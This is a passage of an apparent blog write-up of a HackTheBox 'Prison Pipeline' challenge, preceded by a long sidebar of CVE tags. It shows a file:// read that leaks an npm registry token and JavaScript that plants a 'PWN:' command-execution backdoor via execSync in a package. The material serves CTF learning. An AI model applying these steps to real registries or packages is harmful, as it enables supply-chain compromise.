+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2021-3560/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2021-3560</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2021-38647/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2021-38647</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2021-45010/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2021-45010</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2022-0944/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2022-0944</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2022-22963/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2022-22963</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2022-37706/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2022-37706</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2022-38580/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2022-38580</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2022-41544/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2022-41544</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-0386/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-0386</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-0835/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-0835</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-23752/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-23752</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-30253/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-30253</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-40028/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-40028</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-41425/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-41425</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-4220/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-4220</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-47268/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-47268</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-49070/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-49070</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-50564/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-50564</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2023-51467/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2023-51467</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-20656/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-20656</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-23334/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-23334</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-23346/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-23346</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-25641/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-25641</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-27198/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-27198</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-32002/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-32002</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-32651/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-32651</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-34070/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-34070</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-34716/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-34716</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-36467/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-36467</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-41570/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-41570</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-42327/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-42327</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-47076/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-47076</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-47175/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-47175</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-47176/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-47176</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-47177/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-47177</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2024-9405/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2024-9405</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/debugging/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Debugging</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/gba/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>GBA</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/i2c/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>I2C</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/ida/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Ida</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/intrinsics/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Intrinsics</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/jwt/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>JWT</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/python/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Python</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/shamir/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Shamir</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/simd/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Simd</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/tensorflow/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Tensorflow</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/websocket/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>WebSocket</span>
+<b class=side-tax-count>1</b></a></div></details></nav></aside><main class=site-main><section class=global-search-panel data-global-search hidden aria-live=polite><header class=global-search-head><span>search</span><h2 data-global-search-title>results</h2><button class=global-search-close type=button data-global-search-close aria-label="Close search"><svg class="ico ico-x ico-sm" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6l12 12"/><path d="M18 6 6 18"/></svg></button></header><div class=global-search-status data-global-search-status></div><ul class=global-search-results data-global-search-results role=list></ul></section><div class="container center"><div class=content><article class=post><h1 class=post-title>HackTheBox Prision Pipeline Challenge</h1><div class=post-meta><time class=post-date>2024-12-11</time><span class=post-lastmod>[Updated: 2024-12-11]</span></div><span class=post-tags><a href=/blog/tags/htb/>#htb</a><a href=/blog/tags/misc/>#misc</a></span><div class=post-content><p><a href=https://app.hackthebox.com/challenges/715>https://app.hackthebox.com/challenges/715</a></p><h3 id=description>Description</h3><p>One of our crew members has been captured by mutant raiders and is locked away in their heavily fortified prison. During an initial reconnaissance, the crew managed to gain access to the prison&rsquo;s record management system. Your mission: exploit this system to infiltrate the prison&rsquo;s network and disable the defenses for the rescuers. Can you orchestrate the perfect escape and rescue your comrade before it&rsquo;s too late?</p><h3 id=exploitation>Exploitation</h3><p>my challenge ip and port <code>94.237.60.154:32828</code></p><p>Prisoner Importer &ldquo;Curl under the hood&rdquo;</p><p><code>file:///home/node/.npmrc</code></p><p>Click on Import Prisoner Record</p><pre tabindex=0><code>//localhost:4873/:_authToken=&#34;MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ==&#34;
+</code></pre><p>add in hosts <code>94.237.60.154 registry.prison-pipeline.htb</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> challenge/prisoner-db
+</span></span><span class=line><span class=cl>nano .npmrc
+</span></span></code></pre></div><pre tabindex=0><code>//registry.prison-pipeline.htb:32828/:_authToken=&#34;MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ==&#34;
+</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>npm cache clean --force
+</span></span><span class=line><span class=cl>npm whoami --registry<span class=o>=</span>http://registry.prison-pipeline.htb:32828
+</span></span><span class=line><span class=cl>nano index.js
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>    <span class=kr>async</span> <span class=nx>importPrisoner</span><span class=p>(</span><span class=nx>url</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// implement backdoor
+</span></span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>child_process</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>url</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=s1>&#39;PWN:&#39;</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kd>let</span> <span class=nx>cmd</span> <span class=o>=</span> <span class=nx>url</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=s1>&#39;PWN:&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=kd>let</span> <span class=nx>output</span> <span class=o>=</span> <span class=nx>child_process</span><span class=p>.</span><span class=nx>execSync</span><span class=p>(</span><span class=nx>cmd</span><span class=p>).</span><span class=nx>toString</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=nx>output</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>catch</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=s1>&#39;PWN: Error executing command.&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>        
+</span></span><span class=line><span class=cl>        <span class=p>...</span><span class=nx>SNIP</span><span class=p>...</span>
